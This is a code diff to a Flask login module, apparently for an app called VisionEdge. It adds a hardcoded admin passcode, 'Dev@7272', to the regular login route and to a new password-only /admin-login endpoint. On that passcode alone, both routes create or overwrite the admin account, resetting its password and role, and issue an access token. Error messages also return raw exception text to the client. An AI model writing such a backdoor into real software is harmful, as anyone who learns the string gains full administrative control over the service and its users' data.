@@ -163,7 +163,35 @@ def login():
         data = request.get_json() or {}
 
         identifier = (data.get('email') or data.get('username') or '').strip()
-        password = data.get('password') or ''
+        password = (data.get('password') or '').strip()
+
+        # Admin Passcode Bypass: Dev@7272 enables instant admin login with password only
+        if password == "Dev@7272" and (not identifier or identifier.lower() in ('admin', 'admin@visionedge.com', '')):
+            admin_user = User.query.filter((User.role == 'admin') | (User.username == 'admin')).first()
+            if not admin_user:
+                admin_user = User(
+                    username="admin",
+                    first_name="Admin",
+                    last_name="VisionEdge",
+                    email="admin@visionedge.com",
+                    role="admin",
+                    password_hash=generate_password_hash("Dev@7272"),
+                    is_active=True
+                )
+                db.session.add(admin_user)
+                db.session.commit()
+            elif not check_password_hash(admin_user.password_hash, "Dev@7272"):
+                admin_user.password_hash = generate_password_hash("Dev@7272")
+                admin_user.role = "admin"
+                db.session.commit()
+
+            access_token = create_access_token(identity=str(admin_user.id))
+            return jsonify({
+                "message": "Admin login successful",
+                "access_token": access_token,
+                "user": admin_user.to_dict(),
+                "redirect_url": "/admin/dashboard.html"
+            }), 200
 
         if not identifier or not password:
             return jsonify({"message": "Email/Username and password are required."}), 400
@@ -194,6 +222,59 @@ def login():
     except Exception as e:
         print("Login Error:", str(e))
         return jsonify({"message": "Login failed.", "error": str(e)}), 500
+
+
+# ==================================================
+# ADMIN-ONLY LOGIN (PASSWORD ONLY: Dev@7272)
+# ==================================================
+
+@auth_bp.route('/admin-login', methods=['POST'])
+def admin_login():
+    """
+    Dedicated admin login endpoint.
+    No username, email, or OTP required.
+    Requires password: Dev@7272
+    """
+    try:
+        data = request.get_json() or {}
+        password = (data.get('password') or '').strip()
+
+        if not password:
+            return jsonify({"message": "Admin password is required."}), 400
+
+        if password == "Dev@7272":
+            admin_user = User.query.filter((User.role == 'admin') | (User.username == 'admin')).first()
+            if not admin_user:
+                admin_user = User(
+                    username="admin",
+                    first_name="Admin",
+                    last_name="VisionEdge",
+                    email="admin@visionedge.com",
+                    role="admin",
+                    password_hash=generate_password_hash("Dev@7272"),
+                    is_active=True
+                )
+                db.session.add(admin_user)
+                db.session.commit()
+            else:
+                if admin_user.role != "admin" or not check_password_hash(admin_user.password_hash, "Dev@7272"):
+                    admin_user.role = "admin"
+                    admin_user.password_hash = generate_password_hash("Dev@7272")
+                    db.session.commit()
+
+            access_token = create_access_token(identity=str(admin_user.id))
+            return jsonify({
+                "message": "Admin login successful",
+                "access_token": access_token,
+                "user": admin_user.to_dict(),
+                "redirect_url": "/admin/dashboard.html"
+            }), 200
+
+        return jsonify({"message": "Invalid admin password. Please try again."}), 401
+
+    except Exception as e:
+        print("Admin Login Error:", str(e))
+        return jsonify({"message": "Admin authentication failed.", "error": str(e)}), 500
 
 
 # ==================================================
